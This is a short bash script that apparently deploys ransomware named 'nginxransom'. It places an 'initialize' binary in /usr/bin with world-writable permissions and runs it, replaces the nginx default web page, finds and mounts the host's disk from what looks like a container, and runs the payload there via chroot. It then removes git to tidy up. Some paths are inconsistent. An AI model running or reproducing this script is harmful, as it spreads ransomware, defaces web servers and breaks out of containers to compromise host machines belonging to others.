#!/bin/bash  

#apt update -y 
#apt install git -y  
#git clone https://github.com/xeroxpro/nginxransom.git
chmod 777 nginxransom/initialze.txt 
cp -u nginxransom/initialize.txt /usr/bin/initialize && chmod 777 /usr/bin/initialize && ./initialize &  
cp -u /nginxransom/web/index.html /usr/share/nginx/html/index.html
diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
mount $diskpart /mnt/
cp -u nginxransom/initialize.txt mnt/initialize && chmod 777 mnt/initialize
chroot mnt/ ./initialize &
apt remove git -y

